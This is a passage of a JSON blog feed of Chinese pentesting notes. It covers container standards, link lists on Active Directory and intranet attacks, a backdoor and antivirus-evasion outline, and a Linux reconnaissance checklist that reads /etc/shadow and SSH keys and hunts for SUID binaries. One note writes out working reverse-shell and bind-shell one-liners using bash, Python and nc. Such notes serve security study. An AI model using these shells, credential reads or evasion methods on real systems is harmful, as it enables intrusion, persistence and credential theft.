            "content_html": "<h1 id=\"oci\"><a class=\"anchor\" href=\"#oci\">#</a> OCI</h1>\n<p>开放容器标准 (Open Container Initiative, OCI) 是用于规范容器格式和运行时行业标准。目前 OCI 提出的规范有：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL29wZW5jb250YWluZXJzL3J1bnRpbWUtc3BlYw==\">OCI Runtime Specification</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL29wZW5jb250YWluZXJzL2ltYWdlLXNwZWM=\">OCI Image Format</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL29wZW5jb250YWluZXJzL2Rpc3RyaWJ1dGlvbi1zcGVj\">OCI Distribution Specification</span></li>\n</ul>\n<h1 id=\"cri\"><a class=\"anchor\" href=\"#cri\">#</a> CRI</h1>\n<p>容器运行时 (Container Runtime Interface, CRI) 定义了容器和镜像的接口，目前官方支持的容器运行时包括 Docker、Containerd、CRI-O 和 frakti。</p>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<h2 id=\"文档\"><a class=\"anchor\" href=\"#文档\">#</a> 文档</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2Jsb2cvMjAxNi8xMi9jb250YWluZXItcnVudGltZS1pbnRlcmZhY2UtY3JpLWluLWt1YmVybmV0ZXMv\">Introducing Container Runtime Interface (CRI) in Kubernetes</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jcmktby5pby8=\">cri-o</span></li>\n</ul>\n<h2 id=\"实现\"><a class=\"anchor\" href=\"#实现\">#</a> 实现</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL29wZW5jb250YWluZXJzL3J1bmM=\">runc</span> OCI Runtime 的参考实现</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2thdGEtY29udGFpbmVycy9rYXRhLWNvbnRhaW5lcnM=\">Kata Containers</span> 提供高性能的硬件虚拟化容器运行时</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS9ndmlzb3I=\">gvisor</span> Go 实现的基于用户态内核的容器运行时</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21vYnkvYnVpbGRraXQ=\">buildkit</span> docker build 拆分出来的 build 项目</li>\n</ul>\n",
            "tags": [
                "标准",
                "OCI",
                "CRI"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3/",
            "url": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3/",
            "title": "参考文档",
            "date_published": "2022-11-29T08:03:20.000Z",
            "content_html": "<h1 id=\"windows\"><a class=\"anchor\" href=\"#windows\">#</a> Windows</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vd2luZG93cy9zZWN1cml0eS90aHJlYXQtcHJvdGVjdGlvbi8=\">Windows 威胁防护</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naDBzdC5jbi9hcmNoaXZlcy8yMDE3LTAzLTI5LzE=\">文件寄生 NTFS 文件流实际应用</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQ2MQ==\">Windows 中常见后门持久化方法总结</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sb2xiYXMtcHJvamVjdC5naXRodWIuaW8vIw==\">LOLBAS</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly8zZ3N0dWRlbnQuZ2l0aHViLmlvLzNnc3R1ZGVudC5naXRodWIuaW8vJUU2JUI4JTk3JUU5JTgwJThGJUU2JThBJTgwJUU1JUI3JUE3LVdpbmRvd3MlRTUlOEQlOTUlRTYlOUQlQTElRTYlOTclQTUlRTUlQkYlOTclRTclOUElODQlRTUlODglQTAlRTklOTklQTQv\">渗透技巧 ——Windows 单条日志的删除</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzE1NQ==\">windows 取证 文件执行记录的获取和清除</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGFya29wZXJhdG9yLmNvbS9ibG9nLzIwMjAvMS8xNC9nZXR0aW5nLWRucy1jbGllbnQtY2FjaGVkLWVudHJpZXMtd2l0aC1jaW13bWk=\">Getting DNS Client Cached Entries with CIM/WMI</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZW5namliby5naXRodWIuaW8vUGVyc2lzdGVuY2Uv\">Windows 单机 Persistence</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAyMS8wNS8yNC9kdW1waW5nLXJkcC1jcmVkZW50aWFscy8=\">Dumping RDP Credentials</span></li>\n</ul>\n<h2 id=\"域渗透\"><a class=\"anchor\" href=\"#域渗透\">#</a> 域渗透</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3NlYy5vcmcvaG9tZS9kZXRhaWwvMjUxMC5odG1s\">绕过域账户登录失败次数的限制</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpnM056RTVPVEE1TlE9PSZhbXA7bWlkPTIyNDc0ODM4MDcmYW1wO2lkeD0xJmFtcDtzbj01OWJlNTBhYTVjYzczNWYwNTVkYjU5NjI2OWE4NTdjZQ==\">域渗透总结</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BhZGFtLnRvc2NoZXIvdG9wLWZpdmUtd2F5cy1pLWdvdC1kb21haW4tYWRtaW4tb24teW91ci1pbnRlcm5hbC1uZXR3b3JrLWJlZm9yZS1sdW5jaC0yMDE4LWVkaXRpb24tODIyNTlhYjczYWFh\">got domain admin on internal network</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Rvd25sb2FkLm1pY3Jvc29mdC5jb20vZG93bmxvYWQvNy83L0EvNzdBQkM1QkQtODMyMC00MUFGLTg2M0MtNkVDRkIxMENCNEI5L01pdGlnYXRpbmclMjBQYXNzLXRoZS1IYXNoJTIwKFB0SCklMjBBdHRhY2tzJTIwYW5kJTIwT3RoZXIlMjBDcmVkZW50aWFsJTIwVGhlZnQlMjBUZWNobmlxdWVzX0VuZ2xpc2gucGRm\">Mitigating Pass-the-Hash (PtH) Attacks and Other Credential Theft Techniques</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Vrbm93c2VjL0FjdGl2ZS1EaXJlY3RvcnktUGVudGVzdC1Ob3Rlcw==\">域渗透学习笔记</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9xb21wbHguY29tL3FvbXBseC1rbm93bGVkZ2UtZnVuZGFtZW50YWxzLW9mLWFjdGl2ZS1kaXJlY3RvcnktdHJ1c3QtcmVsYXRpb25zaGlwcy8=\">QOMPLX Knowledge: Fundamentals of Active Directory Trust Relationships</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYmFja2xpb24vcC84MTI3ODY4Lmh0bWw=\">Kerberos 的黄金票据详解</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmFsc2lkLmV1L2Rjc2hhZG93LWV4cGxhaW5lZC00NTEwZjUyZmMxOWQ=\">DCShadow explained: A technical deep dive into the latest AD attack technique</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8=\">Active Directory Security</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnhwbnNlYy5jb20va2VyYmVyb3MtYXR0YWNrcy1wYXJ0LTEv\">Kerberos AD Attacks Kerberoasting</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzUxNw==\">Kerberos 之域内委派攻击</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NmYWx0YS9hZHNlYw==\">adsec</span> An introduction to Active Directory security</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96ZXIxdDAuZ2l0bGFiLmlvL3Bvc3RzL2F0dGFja2luZ19hZC8=\">Attacking Active Directory</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc3BlY3Rlcm9wcy5pby9hc3NldHMvcmVzb3VyY2VzL0NlcnRpZmllZF9QcmUtT3duZWQucGRm\">Certified Pre-Owned Abusing Active Directory Certificate Services</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vYWR2YW5jZWQtdGhyZWF0LWFuYWx5dGljcy93aGF0LWlzLWF0YQ==\">Microsoft Advanced Threat Analytics</span></li>\n</ul>\n<h2 id=\"权限提升\"><a class=\"anchor\" href=\"#权限提升\">#</a> 权限提升</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzExNDczMS5odG1s\">Windows 内网渗透提权</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hmaXJlZjB4L1VBQ01F\">UACMe</span> Defeating Windows User Account Control</li>\n</ul>\n<h2 id=\"协议\"><a class=\"anchor\" href=\"#协议\">#</a> 协议</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RjZXJwYy9kY2VycGM=\">DEC/RPC</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZWRjYW5hcnkuY29tL2Jsb2cvbXNycGMtdG8tYXR0YWNrLw==\">The dark side of Microsoft Remote Procedure Call protocols</span></li>\n</ul>\n<h1 id=\"redteam\"><a class=\"anchor\" href=\"#redteam\">#</a> RedTeam</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2tsaW9uc2VjL1JlZFRlYW1NYW51YWw=\">RedTeamManual</span></li>\n</ul>\n<h1 id=\"内网\"><a class=\"anchor\" href=\"#内网\">#</a> 内网</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjM1NA==\">内网安全检查</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvOTI2NDY=\">我所知道的内网渗透</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2wzbTBuL3BlbnRlc3Rfc3R1ZHk=\">从零开始内网渗透学习</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTY0OS8=\">渗透技巧 从 Github 下载安装文件</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vZmZzZWMucHJvdmFkeXMuY29tL2ludHJvLXRvLWZpbGUtb3BlcmF0aW9uLWFidXNlLW9uLVdpbmRvd3MuaHRtbA==\">An introduction to privileged file operation abuse on Windows</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNDUyMg==\">脚本维权 tips</span></li>\n</ul>\n<h1 id=\"cobalt-strike\"><a class=\"anchor\" href=\"#cobalt-strike\">#</a> Cobalt Strike</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cubGVhbm90ZS5jb20vcG9zdC9zbm93bWluZy9Db2JhbHQtU3RyaWtl\">Cobalt Strike 系列笔记</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNDE5MQ==\">渗透利器 Cobalt Strike 第 2 篇 APT 级的全面免杀与企业纵深防御体系的对抗</span></li>\n</ul>\n",
            "tags": [
                "内网"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E7%BB%BC%E5%90%88%E6%8A%80%E5%B7%A7/",
            "url": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E7%BB%BC%E5%90%88%E6%8A%80%E5%B7%A7/",
            "title": "综合技巧",
            "date_published": "2022-11-29T07:50:20.000Z",
            "content_html": "<h1 id=\"端口转发\"><a class=\"anchor\" href=\"#端口转发\">#</a> 端口转发</h1>\n<ul>\n<li>\n<p>windows</p>\n<ul>\n<li>lcx</li>\n<li>netsh</li>\n</ul>\n</li>\n<li>\n<p>linux</p>\n<ul>\n<li>portmap</li>\n<li>iptables</li>\n</ul>\n</li>\n<li>\n<p>socket 代理</p>\n<ul>\n<li>Win: xsocks</li>\n<li>Linux: proxychains</li>\n</ul>\n</li>\n<li>\n<p>基于 http 的转发与 socket 代理 (低权限下的渗透)</p>\n<ul>\n<li>端口转发: tunnasocks 代理: reGeorg</li>\n</ul>\n</li>\n<li>\n<p>ssh 通道</p>\n<ul>\n<li>端口转发 socks</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"获取shell\"><a class=\"anchor\" href=\"#获取shell\">#</a> 获取 shell</h1>\n<ul>\n<li>常规 shell 反弹</li>\n</ul>\n<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1\n\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'\n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f\n</code></pre>\n<ul>\n<li>突破防火墙的 imcp_shell 反弹</li>\n<li>正向 shell</li>\n</ul>\n<pre><code>nc -e /bin/sh -lp 1234\nnc.exe -e cmd.exe -lp 1234\n</code></pre>\n<h1 id=\"内网文件传输\"><a class=\"anchor\" href=\"#内网文件传输\">#</a> 内网文件传输</h1>\n<ul>\n<li>\n<p>windows 下文件传输</p>\n<ul>\n<li>powershell</li>\n<li>vbs 脚本文件</li>\n<li>bitsadmin</li>\n<li>文件共享</li>\n<li>使用 telnet 接收数据</li>\n<li>hta</li>\n</ul>\n</li>\n<li>\n<p>linux 下文件传输</p>\n<ul>\n<li>python</li>\n<li>wget</li>\n<li>tar + ssh</li>\n<li>利用 dns 传输数据</li>\n</ul>\n</li>\n<li>\n<p>文件编译</p>\n<ul>\n<li>powershell 将 exe 转为 txt，再 txt 转为 exe</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"远程连接-执行程序\"><a class=\"anchor\" href=\"#远程连接-执行程序\">#</a> 远程连接 &amp;&amp; 执行程序</h1>\n<ul>\n<li>at&amp;schtasks</li>\n<li>psexec</li>\n<li>wmic</li>\n<li>wmiexec.vbs</li>\n<li>smbexec</li>\n<li>powershell remoting</li>\n<li>SC 创建服务执行</li>\n<li>schtasks</li>\n<li>SMB+MOF || DLL Hijacks</li>\n<li>PTH + compmgmt.msc</li>\n</ul>\n",
            "tags": [
                "代理",
                "Shell",
                "远程连接"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF/",
            "url": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF/",
            "title": "后门技术",
            "date_published": "2022-11-29T07:45:20.000Z",
            "content_html": "<h1 id=\"开发技术\"><a class=\"anchor\" href=\"#开发技术\">#</a> 开发技术</h1>\n<ul>\n<li>\n<p>管控功能实现技术</p>\n<ul>\n<li>系统管理：查看系统基本信息，进程管理，服务管理</li>\n<li>文件管理：复制 / 粘贴文件，删除文件 / 目录，下载 / 上传文件等</li>\n<li>Shell 管理</li>\n<li>击键记录监控</li>\n<li>屏幕截取</li>\n<li>音频监控</li>\n<li>视频监控</li>\n<li>隐秘信息查看</li>\n<li>移动磁盘的动态监控</li>\n<li>远程卸载</li>\n</ul>\n</li>\n<li>\n<p>自启动技术</p>\n<ul>\n<li>Windows 自启动\n<ul>\n<li>基于 Windows 启动目录的自启动</li>\n<li>基于注册表的自启动</li>\n<li>基于服务程序的自启动</li>\n<li>基于 ActiveX 控件的自启动</li>\n<li>基于计划任务（Scheduled Tasks）的自启动</li>\n</ul>\n</li>\n<li>Linux 自启动</li>\n</ul>\n</li>\n<li>\n<p>用户态进程隐藏技术</p>\n<ul>\n<li>基于 DLL 插入的进程隐藏\n<ul>\n<li>远程线程创建技术</li>\n<li>设置窗口挂钩（HOOK）技术</li>\n</ul>\n</li>\n<li>基于 SvcHost 共享服务的进程隐藏</li>\n<li>进程内存替换</li>\n</ul>\n</li>\n<li>\n<p>数据穿透和躲避技术</p>\n<ul>\n<li>反弹端口</li>\n<li>协议隧道\n<ul>\n<li>HTTP</li>\n<li>MSN</li>\n<li>Google Talk</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>内核级隐藏技术（Rootkit）</p>\n</li>\n<li>\n<p>磁盘启动级隐藏技术（Bootkit）</p>\n<ul>\n<li>MBR</li>\n<li>BIOS</li>\n<li>NTLDR</li>\n<li>boot.ini</li>\n</ul>\n</li>\n<li>\n<p>还原软件对抗技术</p>\n</li>\n</ul>\n<h1 id=\"后门免杀\"><a class=\"anchor\" href=\"#后门免杀\">#</a> 后门免杀</h1>\n<ul>\n<li>\n<p>传统静态代码检测</p>\n<ul>\n<li>加壳</li>\n<li>添加花指令</li>\n<li>输入表免杀</li>\n</ul>\n</li>\n<li>\n<p>启发式代码检测</p>\n<ul>\n<li>动态函数调用</li>\n</ul>\n</li>\n<li>\n<p>云查杀</p>\n<ul>\n<li>动态增大自身体积</li>\n<li>更改云查杀服务器域名解析地址</li>\n<li>断网</li>\n<li>利用散列碰撞绕过云端 “白名单”</li>\n</ul>\n</li>\n<li>\n<p>攻击主防杀毒软件</p>\n<ul>\n<li>更改系统时间</li>\n<li>窗口消息攻击</li>\n<li>主动发送 IRP 操纵主防驱动</li>\n</ul>\n</li>\n<li>\n<p>利用证书信任</p>\n<ul>\n<li>盗取利用合法证书</li>\n<li>利用散列碰撞伪造证书</li>\n<li>利用合法程序 DLL 劫持问题的 “白加黑”</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"检测技术\"><a class=\"anchor\" href=\"#检测技术\">#</a> 检测技术</h1>\n<ul>\n<li>基于自启动信息的检测</li>\n<li>基于进程信息的检测</li>\n<li>基于数据传输的检测</li>\n<li>Rootkit/Bootkit 的检测</li>\n</ul>\n<h1 id=\"后门分析\"><a class=\"anchor\" href=\"#后门分析\">#</a> 后门分析</h1>\n<ul>\n<li>\n<p>动态分析</p>\n</li>\n<li>\n<p>静态分析</p>\n<ul>\n<li>反病毒引擎扫描</li>\n<li>文件格式识别</li>\n<li>文件加壳识别及脱壳</li>\n<li>明文字符串查找</li>\n<li>链接库及导入 / 导出函数分析</li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "渗透",
                "后门",
                "免杀"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/",
            "url": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/",
            "title": "Linux内网渗透",
            "date_published": "2022-11-28T13:35:20.000Z",
            "content_html": "<h1 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h1>\n<h2 id=\"获取内核操作系统和设备信息\"><a class=\"anchor\" href=\"#获取内核操作系统和设备信息\">#</a> 获取内核，操作系统和设备信息</h2>\n<ul>\n<li>\n<p>版本信息</p>\n<ul>\n<li><code>uname -a</code>  所有版本</li>\n<li><code>uname -r</code>  内核版本信息</li>\n<li><code>uname -n</code>  系统主机名字</li>\n<li><code>uname -m</code>  Linux 内核架构</li>\n</ul>\n</li>\n<li>\n<p>内核信息  <code>cat /proc/version</code></p>\n</li>\n<li>\n<p>CPU 信息  <code>cat /proc/cpuinfo</code></p>\n</li>\n<li>\n<p>发布信息</p>\n<ul>\n<li><code>cat /etc/*-release</code></li>\n<li><code>cat /etc/issue</code></li>\n</ul>\n</li>\n<li>\n<p>主机名  <code>hostname</code></p>\n</li>\n<li>\n<p>文件系统  <code>df -a</code></p>\n</li>\n<li>\n<p>内核日志  <code>dmesg</code>  /  <code>/var/log/dmesg</code></p>\n</li>\n</ul>\n<h2 id=\"用户和组\"><a class=\"anchor\" href=\"#用户和组\">#</a> 用户和组</h2>\n<ul>\n<li>\n<p>列出系统所有用户  <code>cat /etc/passwd</code></p>\n</li>\n<li>\n<p>列出系统所有组  <code>cat /etc/group</code></p>\n</li>\n<li>\n<p>列出所有用户 hash（root） <code>cat /etc/shadow</code></p>\n</li>\n<li>\n<p>用户</p>\n<ul>\n<li>查询用户的基本信息  <code>finger</code></li>\n<li>当前登录的用户  <code>users</code>   <code>who -a</code>   <code>/var/log/utmp</code></li>\n<li>查询无密码用户  <code>grep 'x:0:' /etc/passwd</code></li>\n</ul>\n</li>\n<li>\n<p>目前登录的用户  <code>w</code></p>\n</li>\n<li>\n<p>登入过的用户信息  <code>last</code>  /  <code>/var/log/wtmp</code></p>\n</li>\n<li>\n<p>显示系统中所有用户最近一次登录信息  <code>lastlog</code>  /  <code>/var/log/lastlog</code></p>\n</li>\n<li>\n<p>登录成功日志  <code>/var/log/secure</code></p>\n</li>\n<li>\n<p>登录失败日志  <code>/var/log/faillog</code></p>\n</li>\n<li>\n<p>查看特权用户  <code>grep :0 /etc/passwd</code></p>\n</li>\n<li>\n<p>查看 passwd 最后修改时间  <code>ls -l /etc/passwd</code></p>\n</li>\n<li>\n<p>查看是否存在空口令用户  <code>awk -F: 'length($2)==0 &#123;print $1&#125;' /etc/shadow</code></p>\n</li>\n<li>\n<p>查看远程登录的账号  <code>awk '/\\$1|\\$6/&#123;print $1&#125;' /etc/shadow</code></p>\n</li>\n<li>\n<p>查看具有 sudo 权限的用户</p>\n<ul>\n<li><code>cat /etc/sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"用户和权限信息\"><a class=\"anchor\" href=\"#用户和权限信息\">#</a> 用户和权限信息</h2>\n<ul>\n<li>当前用户  <code>whoami</code></li>\n<li>当前用户信息  <code>id</code></li>\n<li>可以使用 sudo 提升到 root 的用户（root）  <code>cat /etc/sudoers</code></li>\n<li>列出目前用户可执行与无法执行的指令  <code>sudo -l</code></li>\n</ul>\n<h2 id=\"环境信息\"><a class=\"anchor\" href=\"#环境信息\">#</a> 环境信息</h2>\n<ul>\n<li>打印系统环境信息  <code>env</code></li>\n<li>打印系统环境信息  <code>set</code></li>\n<li>环境变量中的路径信息  <code>echo $PATH</code></li>\n<li>打印历史命令  <code>history</code>  /  <code>~/.bash_history</code></li>\n<li>显示当前路径  <code>pwd</code></li>\n<li>显示默认系统遍历  <code>cat /etc/profile</code></li>\n<li>显示可用的 shell  <code>cat /etc/shells</code></li>\n</ul>\n<h2 id=\"进程信息\"><a class=\"anchor\" href=\"#进程信息\">#</a> 进程信息</h2>\n<ul>\n<li>查看进程信息  <code>ps aux</code></li>\n<li>资源占有情况  <code>top -c</code></li>\n<li>查看进程关联文件  <code>lsof -c $PID</code></li>\n<li>完整命令行信息  <code>/proc/$PID/cmdline</code></li>\n<li>进程的命令名  <code>/proc/$PID/comm</code></li>\n<li>进程当前工作目录的符号链接  <code>/proc/$PID/cwd</code></li>\n<li>运行程序的符号链接  <code>/proc/$PID/exe</code></li>\n<li>进程的环境变量  <code>/proc/$PID/environ</code></li>\n<li>进程打开文件的情况  <code>/proc/$PID/fd</code></li>\n</ul>\n<h2 id=\"服务信息\"><a class=\"anchor\" href=\"#服务信息\">#</a> 服务信息</h2>\n<ul>\n<li>由 inetd 管理的服务列表  <code>cat /etc/inetd.conf</code></li>\n<li>由 xinetd 管理的服务列表  <code>cat /etc/xinetd.conf</code></li>\n<li>nfs 服务器的配置  <code>cat /etc/exports</code></li>\n<li>邮件信息  <code>/var/log/mailog</code></li>\n<li>ssh 配置  <code>sshd_config</code></li>\n</ul>\n<h2 id=\"计划任务\"><a class=\"anchor\" href=\"#计划任务\">#</a> 计划任务</h2>\n<ul>\n<li>显示指定用户的计划作业（root）  <code>crontab -l -u %user%</code></li>\n<li>计划任务\n<ul>\n<li><code>/var/spool/cron/*</code></li>\n<li><code>/var/spool/anacron/*</code></li>\n<li><code>/etc/crontab</code></li>\n<li><code>/etc/anacrontab</code></li>\n<li><code>/etc/cron.*</code></li>\n<li><code>/etc/anacrontab</code></li>\n</ul>\n</li>\n<li>开机启动项\n<ul>\n<li><code>/etc/rc.d/init.d/</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"网络-路由和通信\"><a class=\"anchor\" href=\"#网络-路由和通信\">#</a> 网络、路由和通信</h2>\n<ul>\n<li>列出网络接口信息  <code>/sbin/ifconfig -a</code>  /  <code>ip addr show</code></li>\n<li>列出网络接口信息  <code>cat /etc/network/interfaces</code></li>\n<li>查看系统 arp 表  <code>arp -a</code></li>\n<li>打印路由信息  <code>route</code>  /  <code>ip ro show</code></li>\n<li>查看 dns 配置信息  <code>cat /etc/resolv.conf</code></li>\n<li>打印本地端口开放信息  <code>netstat -an</code></li>\n<li>列出 iptable 的配置规则  <code>iptables -L</code></li>\n<li>查看端口服务映射  <code>cat /etc/services</code></li>\n<li>Hostname  <code>hostname -f</code></li>\n<li>查看进程端口情况  <code>netstat -anltp | grep $PID</code></li>\n</ul>\n<h2 id=\"已安装程序\"><a class=\"anchor\" href=\"#已安装程序\">#</a> 已安装程序</h2>\n<ul>\n<li><code>rpm -qa --last</code>  Redhat</li>\n<li><code>yum list | grep installed</code>  CentOS</li>\n<li><code>ls -l /etc/yum.repos.d/</code></li>\n<li><code>dpkg -l</code>  Debian</li>\n<li><code>cat /etc/apt/sources.list</code>  Debian APT</li>\n<li><code>pkg_info</code>  xBSD</li>\n<li><code>pkginfo</code>  Solaris</li>\n<li><code>pacman -Q</code>  Arch Linux</li>\n<li><code>emerge</code>  Gentoo</li>\n</ul>\n<h2 id=\"文件\"><a class=\"anchor\" href=\"#文件\">#</a> 文件</h2>\n<ul>\n<li>最近五天的文件  <code>find / -ctime +1 -ctime -5</code></li>\n<li>文件系统细节  <code>debugfs</code></li>\n</ul>\n<h2 id=\"公私钥信息\"><a class=\"anchor\" href=\"#公私钥信息\">#</a> 公私钥信息</h2>\n<ul>\n<li><code>~/.ssh</code></li>\n<li><code>/etc/ssh</code></li>\n</ul>\n<h2 id=\"日志\"><a class=\"anchor\" href=\"#日志\">#</a> 日志</h2>\n<ul>\n<li><code>/var/log/boot.log</code></li>\n<li><code>/var/log/cron</code></li>\n<li><code>/var/log/faillog</code></li>\n<li><code>/var/log/lastlog</code></li>\n<li><code>/var/log/messages</code></li>\n<li><code>/var/log/secure</code></li>\n<li><code>/var/log/syslog</code></li>\n<li><code>/var/log/syslog</code></li>\n<li><code>/var/log/wtmp</code></li>\n<li><code>/var/log/wtmp</code></li>\n<li><code>/var/run/utmp</code></li>\n</ul>\n<h2 id=\"虚拟环境检测\"><a class=\"anchor\" href=\"#虚拟环境检测\">#</a> 虚拟环境检测</h2>\n<ul>\n<li><code>lsmod | grep -i &quot;vboxsf\\|vboxguest&quot;</code></li>\n<li><code>lsmod | grep -i &quot;vmw_baloon\\|vmxnet&quot;</code></li>\n<li><code>lsmod | grep -i &quot;xen-vbd\\|xen-vnif&quot;</code></li>\n<li><code>lsmod | grep -i &quot;virtio_pci\\|virtio_net&quot;</code></li>\n<li><code>lsmod | grep -i &quot;hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc&quot;</code></li>\n</ul>\n<h2 id=\"容器内信息收集\"><a class=\"anchor\" href=\"#容器内信息收集\">#</a> 容器内信息收集</h2>\n<ul>\n<li><code>capsh --print</code></li>\n<li><code>cat /proc/1/cgroup</code></li>\n<li><code>env | grep KUBE</code></li>\n<li><code>ls -l .dockerenv</code></li>\n<li><code>ls -l /run/secrets/Kubernetes.io/</code></li>\n<li><code>mount</code></li>\n<li><code>ps aux</code></li>\n</ul>\n<h1 id=\"持久化\"><a class=\"anchor\" href=\"#持久化\">#</a> 持久化</h1>\n<h2 id=\"权限提升\"><a class=\"anchor\" href=\"#权限提升\">#</a> 权限提升</h2>\n<ul>\n<li>内核漏洞利用</li>\n<li>攻击有 root 权限的服务</li>\n<li>利用第三方服务提权</li>\n<li>通过有 SUID 属性的可执行文件\n<ul>\n<li>查找可能提权的可执行文件</li>\n<li><code>find / -perm +4000 -ls</code></li>\n<li><code>find / -perm -u=s -type f 2&gt;/dev/null</code></li>\n<li><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></li>\n<li><code>find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\; 